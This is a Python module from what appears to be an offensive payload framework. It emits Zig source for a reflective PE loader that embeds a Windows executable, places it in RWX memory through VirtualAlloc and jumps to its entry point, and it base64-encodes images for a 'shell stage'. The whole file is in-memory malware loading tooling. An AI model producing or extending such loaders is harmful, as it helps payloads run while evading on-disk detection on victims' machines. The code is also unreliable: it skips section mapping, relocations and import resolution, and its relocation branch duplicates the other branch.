#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Reflective PE loader helpers for staged Windows payloads."""

from __future__ import annotations

import base64
from dataclasses import dataclass
from typing import List, Optional


@dataclass
class ReflectiveLoadSpec:
    image_bytes: bytes
    entry_rva: int = 0
    args: str = ""


def validate_pe_header(image: bytes) -> bool:
    return len(image) >= 64 and image[0:2] == b"MZ"


def pe_embedded_bytes_literal(image: bytes, *, var_name: str = "embedded_pe") -> str:
    """Return Zig byte array literal for an embedded PE image."""
    if not image:
        return f"const {var_name}: []const u8 = &[_]u8{{}};"
    chunks: List[str] = []
    for i in range(0, len(image), 16):
        part = image[i : i + 16]
        chunks.append("    " + ", ".join(f"0x{b:02x}" for b in part) + ",")
    body = "\n".join(chunks)
    return f"const {var_name}: []const u8 = &[_]u8{{\n{body}\n}};"


def build_reflective_loader_zig(*, var_name: str = "embedded_pe", entry_symbol: str = "ReflectiveEntry") -> str:
    """Return Zig source that maps a PE image in memory and jumps to its entry point."""
    return f"""
const std = @import("std");
const windows = std.os.windows;
const kernel32 = windows.kernel32;

fn reflectiveLoadPe(image: []const u8) !void {{
    if (image.len < 64 or image[0] != 'M' or image[1] != 'Z') return error.InvalidPe;
    const e_lfanew = std.mem.readInt(i32, image[0x3c..][0..4], .little);
    if (e_lfanew <= 0 or @as(usize, @intCast(e_lfanew)) + 0x108 > image.len) return error.InvalidPe;
    const pe_off: usize = @intCast(e_lfanew);
    if (image[pe_off] != 'P' or image[pe_off + 1] != 'E') return error.InvalidPe;
    const opt_off = pe_off + 24;
    const magic = std.mem.readInt(u16, image[opt_off..][0..2], .little);
    if (magic != 0x20b) return error.UnsupportedPe;
    const size_of_image = std.mem.readInt(u32, image[opt_off + 56 ..][0..4], .little);
    const entry_rva = std.mem.readInt(u32, image[opt_off + 16 ..][0..4], .little);
    const image_base = std.mem.readInt(u64, image[opt_off + 24 ..][0..8], .little);

    const base = kernel32.VirtualAlloc(
        @ptrFromInt(image_base),
        size_of_image,
        windows.MEM_COMMIT | windows.MEM_RESERVE,
        windows.PAGE_EXECUTE_READWRITE,
    );
    const mapped: [*]u8 = if (base) @ptrCast(base) else return error.AllocFailed;
    if (base != @ptrFromInt(image_base)) {{
        @memcpy(mapped[0..image.len], image);
    }} else {{
        @memcpy(mapped[0..image.len], image);
    }}

    const entry = @as(*const fn () callconv(.c) void, @ptrFromInt(@intFromPtr(mapped) + entry_rva));
    entry();
}}

pub fn {entry_symbol}() void {{
    reflectiveLoadPe({var_name}) catch {{
        return;
    }};
}}
""".strip()


def build_reflective_pe_wrapper_zig(image: bytes, *, var_name: str = "embedded_pe") -> str:
    """Combine embedded PE bytes and reflective loader bootstrap."""
    if not validate_pe_header(image):
        raise ValueError("Reflective loader requires a valid PE (MZ) image")
    return pe_embedded_bytes_literal(image, var_name=var_name) + "\n\n" + build_reflective_loader_zig(var_name=var_name)


def build_reflective_loader_bootstrap(*, var_name: str = "_kitty_reflective") -> str:
    """Return Python stub that documents the reflective hand-off point."""
    return f'''
{var_name} = {{"supported": True, "note": "Use windows_x64_shell_stage with generate_exe + reflective_pe"}}

def _kitty_reflective_load(image_bytes, entry_rva=0):
    raise NotImplementedError("Reflective loader must be executed by native stage (windows_x64_shell_stage)")
'''.strip()


def encode_pe_for_stage(image: bytes) -> str:
    return base64.b64encode(image).decode("ascii")
